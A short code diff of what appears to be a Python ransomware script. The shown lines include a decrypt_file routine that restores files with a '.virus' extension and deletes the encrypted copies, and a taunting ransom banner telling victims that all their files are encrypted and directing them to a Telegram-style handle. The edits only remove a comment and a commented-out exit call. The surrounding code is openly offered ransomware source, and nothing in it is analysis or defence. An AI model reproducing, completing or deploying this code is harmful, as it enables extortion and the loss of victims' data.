@@ -44,7 +44,7 @@ def decrypt_file(file_path, key):
     with open(file_path, 'rb') as file:
         encrypted_data = file.read()
         decrypted_data = cipher.decrypt(encrypted_data)
-        decrypted_file_path = file_path[:-6]  # حذف قسمت '.virus' از نام فایل
+        decrypted_file_path = file_path[:-6]  
         with open(decrypted_file_path, 'wb') as decrypted_file:
             decrypted_file.write(decrypted_data)
         os.remove(file_path)
@@ -97,7 +97,7 @@ print (f"""
 {lrd}[{lgn}♡{lrd}] {be}Ha ha ha.... {pe}All your files are encrypted, you can send a message to the manufacturer to get back : {yw}@Esfelurm                                                                                                   
 """)
 decryption_key_str = input(f"\n{lrd}[{lgn}?{lrd}] {cn}Enter the decryption key: ")
-	#exit()
+	
 try:
     decryption_key = decryption_key_str.encode()
     print (f"\n\n{lrd}[{lgn}!{lrd}] {lgn}The password is correct! please wait ...")
